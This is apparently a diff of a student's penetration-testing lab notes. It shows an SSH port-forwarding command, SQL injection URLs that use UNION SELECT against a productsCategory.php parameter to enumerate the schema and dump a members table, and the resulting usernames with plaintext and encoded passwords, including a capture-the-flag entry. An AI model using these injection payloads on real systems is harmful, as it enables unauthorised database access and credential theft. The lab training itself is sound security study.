@@ -110,7 +110,7 @@ sudo ssh -MS /tmp/jump student@10.50.15.162 -L 23300:10.100.28.48:4444 -L 23301:
                     brought me to Donovia National Logistics Agency Website
 
 http://127.0.0.1:23301/cases/productsCategory.php?category=13%20UNION%20SELECT%20table_schema,Table_name,column_name%20From%20information_schema.columns
-http://127.0.0.1:23301/cases/productsCategory.php?category=13%20UNION%20SELECT%20id,username,password%20from%20sqlinjection.members
+http://127.0.0.1:23301/cases/productsCategory.php?category=13 UNION SELECT id,username,password from sqlinjection.members
                     1	Boss	0tj6MAeQtNWmN6gGhRmB
                     2	Maverick	turn&burn
                     3	phreak	pwd
@@ -122,8 +122,12 @@ http://127.0.0.1:23301/cases/productsCategory.php?category=13%20UNION%20SELECT%2
                     9	Joe	vato
                     10		flag:
 
-
-
+username,name,user_id from siteusers.$users
+          nccyrObggbzW3na$ 	1 	$Aaron
+          GhexrlQnl24 	2 	$user2
+          Obo4GURCva3nccyrf 	3 	$user3
+          Lroth 	4 	$Lee_Roth
+          nabgurecnffjbeq4GURntrf 	4 	$Lroth   
 
 
 
